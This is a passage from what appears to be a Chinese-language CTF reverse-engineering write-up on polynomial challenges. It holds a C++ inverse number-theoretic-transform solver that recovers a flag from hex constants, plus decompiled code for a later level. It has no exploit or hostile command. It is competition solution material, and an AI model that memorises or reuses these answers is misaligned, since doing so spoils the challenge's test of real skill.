<span><span style="color: #403F53">    </span><span style="color: #AA0982">0x00000fcc</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x00000104</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x0749db91</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x343624e8</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x0d13ca29</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x272a2071</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x36a7f6c3</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x0c1a1e65</span><span style="color: #403F53">,</span></span>
<span><span style="color: #403F53">    </span><span style="color: #AA0982">0x1f1ad239</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x01f3ec88</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x020a0b87</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x36c3abd1</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x05559031</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x34c4b3f4</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x12708155</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x0c18c538</span><span style="color: #403F53">,</span></span>
<span><span style="color: #403F53">    </span><span style="color: #AA0982">0x2afc9af2</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x11eaefa9</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x088b5998</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x2cc0fd8f</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x10370a24</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x09c6d2a3</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x29d08b05</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x04f4d794</span><span style="color: #403F53">,</span></span>
<span><span style="color: #403F53">    </span><span style="color: #AA0982">0x2c5f4e4e</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x3a038304</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x2071b91e</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x1b445996</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x31373cf5</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x21e86de9</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x37bf21f8</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x2f9134fb</span><span style="color: #403F53">,</span></span>
<span><span style="color: #403F53">    </span><span style="color: #AA0982">0x21770505</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x027a31ad</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x1043be97</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x0c84bff9</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x2e286891</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x27a8054e</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x3886de12</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x20e03387</span><span style="color: #403F53">,</span></span>
<span><span style="color: #403F53">    </span><span style="color: #AA0982">0x1bfe24ef</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x01839cf5</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x2562af12</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x09009f44</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x284b4a3b</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x2eaa70ec</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x0859bba4</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x1507cc41</span><span style="color: #403F53">,</span></span>
<span><span style="color: #403F53">    </span><span style="color: #AA0982">0x3b34c2e5</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x2a5819f3</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x2a1aa122</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x15c8a1b3</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x2b94d4e7</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x3760071c</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x2e63c3af</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x315e10bd</span><span style="color: #403F53">,</span></span>
<span><span style="color: #403F53">    </span><span style="color: #AA0982">0x0b54503c</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x06f4408e</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x09400d3e</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x38b88f00</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x336d0b03</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x164dcc04</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x2edbbdf1</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x0e53e235</span><span style="color: #403F53">};</span></span>
<span></span>
<span><span style="color: #994CC3">int</span><span style="color: #403F53"> </span><span style="color: #4876D6">qpow</span><span style="color: #403F53">(</span><span style="color: #994CC3">int</span><span style="color: #403F53"> x, </span><span style="color: #994CC3">int</span><span style="color: #403F53"> y)</span></span>
<span><span style="color: #403F53">{</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">int</span><span style="color: #403F53"> out </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">1</span><span style="color: #403F53">;</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">while</span><span style="color: #403F53"> (y)</span></span>
<span><span style="color: #403F53">    {</span></span>
<span><span style="color: #403F53">        </span><span style="color: #994CC3">if</span><span style="color: #403F53"> (y </span><span style="color: #994CC3">&amp;</span><span style="color: #403F53"> </span><span style="color: #AA0982">1</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">            out </span><span style="color: #994CC3">=</span><span style="color: #403F53"> (ll)out </span><span style="color: #994CC3">*</span><span style="color: #403F53"> x </span><span style="color: #994CC3">%</span><span style="color: #403F53"> mod;</span></span>
<span><span style="color: #403F53">        x </span><span style="color: #994CC3">=</span><span style="color: #403F53"> (ll)x </span><span style="color: #994CC3">*</span><span style="color: #403F53"> x </span><span style="color: #994CC3">%</span><span style="color: #403F53"> mod;</span></span>
<span><span style="color: #403F53">        y </span><span style="color: #994CC3">&gt;&gt;=</span><span style="color: #403F53"> </span><span style="color: #AA0982">1</span><span style="color: #403F53">;</span></span>
<span><span style="color: #403F53">    }</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">return</span><span style="color: #403F53"> out;</span></span>
<span><span style="color: #403F53">}</span></span>
<span></span>
<span><span style="color: #994CC3">void</span><span style="color: #403F53"> </span><span style="color: #4876D6">ntt</span><span style="color: #403F53">(</span><span style="color: #994CC3">int</span><span style="color: #403F53"> </span><span style="color: #994CC3">*</span><span style="color: #403F53">A, </span><span style="color: #994CC3">int</span><span style="color: #403F53"> type, </span><span style="color: #994CC3">int</span><span style="color: #403F53"> L)</span></span>
<span><span style="color: #403F53">{</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">int</span><span style="color: #403F53"> i, j, k, wn, w, t;</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">for</span><span style="color: #403F53"> (i </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">1</span><span style="color: #403F53">; i </span><span style="color: #994CC3">&lt;</span><span style="color: #403F53"> L; </span><span style="color: #994CC3">++</span><span style="color: #403F53">i)</span></span>
<span><span style="color: #403F53">        </span><span style="color: #994CC3">if</span><span style="color: #403F53"> (i </span><span style="color: #994CC3">&lt;</span><span style="color: #403F53"> </span><span style="color: #4876D6">r</span><span style="color: #403F53">[i])</span></span>
<span><span style="color: #403F53">            </span><span style="color: #4876D6">swap</span><span style="color: #403F53">(</span><span style="color: #4876D6">A</span><span style="color: #403F53">[i], </span><span style="color: #4876D6">A</span><span style="color: #403F53">[</span><span style="color: #4876D6">r</span><span style="color: #403F53">[i]]);</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">for</span><span style="color: #403F53"> (i </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">1</span><span style="color: #403F53">; i </span><span style="color: #994CC3">&lt;</span><span style="color: #403F53"> L; i </span><span style="color: #994CC3">&lt;&lt;=</span><span style="color: #403F53"> </span><span style="color: #AA0982">1</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">    {</span></span>
<span><span style="color: #403F53">        wn </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #4876D6">qpow</span><span style="color: #403F53">(G, (mod </span><span style="color: #994CC3">-</span><span style="color: #403F53"> </span><span style="color: #AA0982">1</span><span style="color: #403F53">) </span><span style="color: #994CC3">/</span><span style="color: #403F53"> (i </span><span style="color: #994CC3">&lt;&lt;</span><span style="color: #403F53"> </span><span style="color: #AA0982">1</span><span style="color: #403F53">));</span></span>
<span><span style="color: #403F53">        </span><span style="color: #994CC3">for</span><span style="color: #403F53"> (j </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">0</span><span style="color: #403F53">; j </span><span style="color: #994CC3">&lt;</span><span style="color: #403F53"> L; j </span><span style="color: #994CC3">+=</span><span style="color: #403F53"> i </span><span style="color: #994CC3">*</span><span style="color: #403F53"> </span><span style="color: #AA0982">2</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">        {</span></span>
<span><span style="color: #403F53">            </span><span style="color: #994CC3">for</span><span style="color: #403F53"> (k </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">0</span><span style="color: #403F53">, w </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">1</span><span style="color: #403F53">; k </span><span style="color: #994CC3">&lt;</span><span style="color: #403F53"> i; </span><span style="color: #994CC3">++</span><span style="color: #403F53">k, w </span><span style="color: #994CC3">=</span><span style="color: #403F53"> (ll)w </span><span style="color: #994CC3">*</span><span style="color: #403F53"> wn </span><span style="color: #994CC3">%</span><span style="color: #403F53"> mod)</span></span>
<span><span style="color: #403F53">            {</span></span>
<span><span style="color: #403F53">                t </span><span style="color: #994CC3">=</span><span style="color: #403F53"> (ll)</span><span style="color: #4876D6">A</span><span style="color: #403F53">[i </span><span style="color: #994CC3">+</span><span style="color: #403F53"> j </span><span style="color: #994CC3">+</span><span style="color: #403F53"> k] </span><span style="color: #994CC3">*</span><span style="color: #403F53"> w </span><span style="color: #994CC3">%</span><span style="color: #403F53"> mod;</span></span>
<span><span style="color: #403F53">                </span><span style="color: #4876D6">A</span><span style="color: #403F53">[i </span><span style="color: #994CC3">+</span><span style="color: #403F53"> j </span><span style="color: #994CC3">+</span><span style="color: #403F53"> k] </span><span style="color: #994CC3">=</span><span style="color: #403F53"> (</span><span style="color: #4876D6">A</span><span style="color: #403F53">[j </span><span style="color: #994CC3">+</span><span style="color: #403F53"> k] </span><span style="color: #994CC3">-</span><span style="color: #403F53"> t </span><span style="color: #994CC3">+</span><span style="color: #403F53"> mod) </span><span style="color: #994CC3">%</span><span style="color: #403F53"> mod;</span></span>
<span><span style="color: #403F53">                </span><span style="color: #4876D6">A</span><span style="color: #403F53">[j </span><span style="color: #994CC3">+</span><span style="color: #403F53"> k] </span><span style="color: #994CC3">=</span><span style="color: #403F53"> (</span><span style="color: #4876D6">A</span><span style="color: #403F53">[j </span><span style="color: #994CC3">+</span><span style="color: #403F53"> k] </span><span style="color: #994CC3">+</span><span style="color: #403F53"> t) </span><span style="color: #994CC3">%</span><span style="color: #403F53"> mod;</span></span>
<span><span style="color: #403F53">            }</span></span>
<span><span style="color: #403F53">        }</span></span>
<span><span style="color: #403F53">    }</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">if</span><span style="color: #403F53"> (type </span><span style="color: #994CC3">==</span><span style="color: #403F53"> </span><span style="color: #994CC3">-</span><span style="color: #AA0982">1</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">    {</span></span>
<span><span style="color: #403F53">        </span><span style="color: #4876D6">reverse</span><span style="color: #403F53">(A </span><span style="color: #994CC3">+</span><span style="color: #403F53"> </span><span style="color: #AA0982">1</span><span style="color: #403F53">, A </span><span style="color: #994CC3">+</span><span style="color: #403F53"> L);</span></span>
<span><span style="color: #403F53">        </span><span style="color: #994CC3">int</span><span style="color: #403F53"> inv </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #4876D6">qpow</span><span style="color: #403F53">(L, mod </span><span style="color: #994CC3">-</span><span style="color: #403F53"> </span><span style="color: #AA0982">2</span><span style="color: #403F53">);</span></span>
<span><span style="color: #403F53">        </span><span style="color: #994CC3">for</span><span style="color: #403F53"> (i </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">0</span><span style="color: #403F53">; i </span><span style="color: #994CC3">&lt;</span><span style="color: #403F53"> L; </span><span style="color: #994CC3">++</span><span style="color: #403F53">i)</span></span>
<span><span style="color: #403F53">            </span><span style="color: #4876D6">A</span><span style="color: #403F53">[i] </span><span style="color: #994CC3">=</span><span style="color: #403F53"> (ll)</span><span style="color: #4876D6">A</span><span style="color: #403F53">[i] </span><span style="color: #994CC3">*</span><span style="color: #403F53"> inv </span><span style="color: #994CC3">%</span><span style="color: #403F53"> mod;</span></span>
<span><span style="color: #403F53">    }</span></span>
<span><span style="color: #403F53">}</span></span>
<span></span>
<span><span style="color: #994CC3">int</span><span style="color: #403F53"> </span><span style="color: #4876D6">main</span><span style="color: #403F53">()</span></span>
<span><span style="color: #403F53">{</span></span>
<span><span style="color: #403F53">    </span><span style="color: #4876D6">ntt</span><span style="color: #403F53">(a, </span><span style="color: #994CC3">-</span><span style="color: #AA0982">1</span><span style="color: #403F53">, N);</span></span>
<span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">for</span><span style="color: #403F53"> (</span><span style="color: #994CC3">int</span><span style="color: #403F53"> i </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">0</span><span style="color: #403F53">; i </span><span style="color: #994CC3">&lt;</span><span style="color: #403F53"> N; </span><span style="color: #994CC3">++</span><span style="color: #403F53">i)</span></span>
<span><span style="color: #403F53">        </span><span style="color: #4876D6">putchar</span><span style="color: #403F53">(</span><span style="color: #4876D6">a</span><span style="color: #403F53">[i]);</span></span>
<span><span style="color: #403F53">}</span></span></code></pre></div></section>
<p><picture><source type="image/webp" srcset="/assets/poly-flag2.010538ef.webp"><img srcset="/assets/poly-flag2.1dedb124.png" loading="lazy" src="/assets/poly-flag2.1dedb124.png" width="530" height="53" alt="flag2"></picture></p>
<h4 id="level-3-5" class="heading"><a href="#level-3-5" class="heading-anchor" aria-label="章节： Level 3" tabindex="-1"></a><span>Level 3</span></h4>
<p>反编译发现是多项式乘法<span class="mojikumi-line-end">：</span></p>
<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h5 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="C++ 代码块" data-v-ad49d235>C++</h5><ile-root id="ile-31"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-31--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #D6DEEB">n </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">2</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">&lt;&lt;</span><span style="color: #D6DEEB"> (bVar1 </span><span style="color: #C792EA">&amp;</span><span style="color: #D6DEEB"> </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">1f</span><span style="color: #D6DEEB">);</span></span>
<span><span style="color: #D6DEEB">a </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #82AAFF">malloc</span><span style="color: #D6DEEB">((</span><span style="color: #C792EA">long</span><span style="color: #D6DEEB">)(n </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">2</span><span style="color: #D6DEEB">) </span><span style="color: #C792EA">&lt;&lt;</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">2</span><span style="color: #D6DEEB">);</span></span>
<span><span style="color: #D6DEEB">b </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #82AAFF">malloc</span><span style="color: #D6DEEB">((</span><span style="color: #C792EA">long</span><span style="color: #D6DEEB">)(n </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">2</span><span style="color: #D6DEEB">) </span><span style="color: #C792EA">&lt;&lt;</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">2</span><span style="color: #D6DEEB">);</span></span>
<span><span style="color: #82AAFF">memset</span><span style="color: #D6DEEB">(a,</span><span style="color: #F78C6C">0</span><span style="color: #D6DEEB">,(</span><span style="color: #C792EA">long</span><span style="color: #D6DEEB">)(n </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">2</span><span style="color: #D6DEEB">) </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">4</span><span style="color: #D6DEEB">);</span></span>
<span><span style="color: #82AAFF">memset</span><span style="color: #D6DEEB">(b,</span><span style="color: #F78C6C">0</span><span style="color: #D6DEEB">,(</span><span style="color: #C792EA">long</span><span style="color: #D6DEEB">)(n </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">2</span><span style="color: #D6DEEB">) </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">4</span><span style="color: #D6DEEB">);</span></span>
<span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> (i1 </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">0</span><span style="color: #D6DEEB">; i1 </span><span style="color: #C792EA">&lt;</span><span style="color: #D6DEEB"> len; i1 </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> i1 </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">) {</span></span>
<span><span style="color: #D6DEEB">    pcVar3 </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> (</span><span style="color: #C792EA">char</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB">)std::__cxx11::basic_string&lt;&gt;::operator[]((ulong)local_48);</span></span>
<span><span style="color: #D6DEEB">    mint::</span><span style="color: #82AAFF">mint</span><span style="color: #D6DEEB">((mint </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB">)</span><span style="color: #C792EA">&amp;</span><span style="color: #D6DEEB">local_78,(</span><span style="color: #C792EA">int</span><span style="color: #D6DEEB">)</span><span style="color: #C792EA">*</span><span style="color: #D6DEEB">pcVar3);</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB">(undefined4 </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB">)((</span><span style="color: #C792EA">long</span><span style="color: #D6DEEB">)i1 </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">4</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> (</span><span style="color: #C792EA">long</span><span style="color: #D6DEEB">)a) </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> local_78;</span></span>
<span><span style="color: #D6DEEB">}</span></span>
<span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> (i2 </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">0</span><span style="color: #D6DEEB">; i2 </span><span style="color: #C792EA">&lt;</span><span style="color: #D6DEEB"> n; i2 </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> i2 </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">) {</span></span>
<span><span style="color: #D6DEEB">    mint::</span><span style="color: #82AAFF">mint</span><span style="color: #D6DEEB">((mint </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB">)</span><span style="color: #C792EA">&amp;</span><span style="color: #D6DEEB">local_78,</span><span style="color: #C5E478">u_welcome_to_the_world_of_polynomi_00305020</span><span style="color: #D6DEEB">[i2 </span><span style="color: #C792EA">%</span><span style="color: #D6DEEB"> </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">22</span><span style="color: #D6DEEB">]);</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB">(undefined4 </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB">)((</span><span style="color: #C792EA">long</span><span style="color: #D6DEEB">)i2 </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">4</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> (</span><span style="color: #C792EA">long</span><span style="color: #D6DEEB">)b) </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> local_78;</span></span>
<span><span style="color: #D6DEEB">}</span></span>
<span><span style="color: #82AAFF">FUN_001014be</span><span style="color: #D6DEEB">(a,n </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">2</span><span style="color: #D6DEEB">);</span></span>
<span><span style="color: #82AAFF">FUN_001014be</span><span style="color: #D6DEEB">(b,n </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">2</span><span style="color: #D6DEEB">);</span></span>
<span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> (i3 </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">0</span><span style="color: #D6DEEB">; i3 </span><span style="color: #C792EA">&lt;</span><span style="color: #D6DEEB"> n </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">2</span><span style="color: #D6DEEB">; i3 </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> i3 </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">) {</span></span>
<span><span style="color: #D6DEEB">    mint::operator</span><span style="color: #C792EA">*=</span><span style="color: #D6DEEB">((mint </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB">)((</span><span style="color: #C792EA">long</span><span style="color: #D6DEEB">)a </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> (</span><span style="color: #C792EA">long</span><span style="color: #D6DEEB">)i3 </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">4</span><span style="color: #D6DEEB">),</span></span>
<span><span style="color: #D6DEEB">                    </span><span style="color: #82AAFF">SUB41</span><span style="color: #D6DEEB">(</span><span style="color: #C792EA">*</span><span style="color: #D6DEEB">(undefined4 </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB">)((</span><span style="color: #C792EA">long</span><span style="color: #D6DEEB">)i3 </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">4</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> (</span><span style="color: #C792EA">long</span><span style="color: #D6DEEB">)b),</span><span style="color: #F78C6C">0</span><span style="color: #D6DEEB">));</span></span>
<span><span style="color: #D6DEEB">}</span></span>
<span><span style="color: #82AAFF">FUN_00101627</span><span style="color: #D6DEEB">(a,n </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">2</span><span style="color: #D6DEEB">);</span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #403F53">n </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">2</span><span style="color: #403F53"> </span><span style="color: #994CC3">&lt;&lt;</span><span style="color: #403F53"> (bVar1 </span><span style="color: #994CC3">&amp;</span><span style="color: #403F53"> </span><span style="color: #AA0982">0x1f</span><span style="color: #403F53">);</span></span>
<span><span style="color: #403F53">a </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #4876D6">malloc</span><span style="color: #403F53">((</span><span style="color: #994CC3">long</span><span style="color: #403F53">)(n </span><span style="color: #994CC3">*</span><span style="color: #403F53"> </span><span style="color: #AA0982">2</span><span style="color: #403F53">) </span><span style="color: #994CC3">&lt;&lt;</span><span style="color: #403F53"> </span><span style="color: #AA0982">2</span><span style="color: #403F53">);</span></span>
<span><span style="color: #403F53">b </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #4876D6">malloc</span><span style="color: #403F53">((</span><span style="color: #994CC3">long</span><span style="color: #403F53">)(n </span><span style="color: #994CC3">*</span><span style="color: #403F53"> </span><span style="color: #AA0982">2</span><span style="color: #403F53">) </span><span style="color: #994CC3">&lt;&lt;</span><span style="color: #403F53"> </span><span style="color: #AA0982">2</span><span style="color: #403F53">);</span></span>
<span><span style="color: #4876D6">memset</span><span style="color: #403F53">(a,</span><span style="color: #AA0982">0</span><span style="color: #403F53">,(</span><span style="color: #994CC3">long</span><span style="color: #403F53">)(n </span><span style="color: #994CC3">*</span><span style="color: #403F53"> </span><span style="color: #AA0982">2</span><span style="color: #403F53">) </span><span style="color: #994CC3">*</span><span style="color: #403F53"> </span><span style="color: #AA0982">4</span><span style="color: #403F53">);</span></span>
<span><span style="color: #4876D6">memset</span><span style="color: #403F53">(b,</span><span style="color: #AA0982">0</span><span style="color: #403F53">,(</span><span style="color: #994CC3">long</span><span style="color: #403F53">)(n </span><span style="color: #994CC3">*</span><span style="color: #403F53"> </span><span style="color: #AA0982">2</span><span style="color: #403F53">) </span><span style="color: #994CC3">*</span><span style="color: #403F53"> </span><span style="color: #AA0982">4</span><span style="color: #403F53">);</span></span>
<span><span style="color: #994CC3">for</span><span style="color: #403F53"> (i1 </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">0</span><span style="color: #403F53">; i1 </span><span style="color: #994CC3">&lt;</span><span style="color: #403F53"> len; i1 </span><span style="color: #994CC3">=</span><span style="color: #403F53"> i1 </span><span style="color: #994CC3">+</span><span style="color: #403F53"> </span><span style="color: #AA0982">1</span><span style="color: #403F53">) {</span></span>
<span><span style="color: #403F53">    pcVar3 </span><span style="color: #994CC3">=</span><span style="color: #403F53"> (</span><span style="color: #994CC3">char</span><span style="color: #403F53"> </span><span style="color: #994CC3">*</span><span style="color: #403F53">)std::__cxx11::basic_string&lt;&gt;::operator[]((ulong)local_48);</span></span>
<span><span style="color: #403F53">    mint::</span><span style="color: #4876D6">mint</span><span style="color: #403F53">((mint </span><span style="color: #994CC3">*</span><span style="color: #403F53">)</span><span style="color: #994CC3">&amp;</span><span style="color: #403F53">local_78,(</span><span style="color: #994CC3">int</span><span style="color: #403F53">)</span><span style="color: #994CC3">*</span><span style="color: #403F53">pcVar3);</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">*</span><span style="color: #403F53">(undefined4 </span><span style="color: #994CC3">*</span><span style="color: #403F53">)((</span><span style="color: #994CC3">long</span><span style="color: #403F53">)i1 </span><span style="color: #994CC3">*</span><span style="color: #403F53"> </span><span style="color: #AA0982">4</span><span style="color: #403F53"> </span><span style="color: #994CC3">+</span><span style="color: #403F53"> (</span><span style="color: #994CC3">long</span><span style="color: #403F53">)a) </span><span style="color: #994CC3">=</span><span style="color: #403F53"> local_78;</span></span>
<span><span style="color: #403F53">}</span></span>
<span><span style="color: #994CC3">for</span><span style="color: #403F53"> (i2 </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">0</span><span style="color: #403F53">; i2 </span><span style="color: #994CC3">&lt;</span><span style="color: #403F53"> n; i2 </span><span style="color: #994CC3">=</span><span style="color: #403F53"> i2 </span><span style="color: #994CC3">+</span><span style="color: #403F53"> </span><span style="color: #AA0982">1</span><span style="color: #403F53">) {</span></span>
<span><span style="color: #403F53">    mint::</span><span style="color: #4876D6">mint</span><span style="color: #403F53">((mint </span><span style="color: #994CC3">*</span><span style="color: #403F53">)</span><span style="color: #994CC3">&amp;</span><span style="color: #403F53">local_78,</span><span style="color: #4876D6">u_welcome_to_the_world_of_polynomi_00305020</span><span style="color: #403F53">[i2 </span><span style="color: #994CC3">%</span><span style="color: #403F53"> </span><span style="color: #AA0982">0x22</span><span style="color: #403F53">]);</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">*</span><span style="color: #403F53">(undefined4 </span><span style="color: #994CC3">*</span><span style="color: #403F53">)((</span><span style="color: #994CC3">long</span><span style="color: #403F53">)i2 </span><span style="color: #994CC3">*</span><span style="color: #403F53"> </span><span style="color: #AA0982">4</span><span style="color: #403F53"> </span><span style="color: #994CC3">+</span><span style="color: #403F53"> (</span><span style="color: #994CC3">long</span><span style="color: #403F53">)b) </span><span style="color: #994CC3">=</span><span style="color: #403F53"> local_78;</span></span>
<span><span style="color: #403F53">}</span></span>
<span><span style="color: #4876D6">FUN_001014be</span><span style="color: #403F53">(a,n </span><span style="color: #994CC3">*</span><span style="color: #403F53"> </span><span style="color: #AA0982">2</span><span style="color: #403F53">);</span></span>
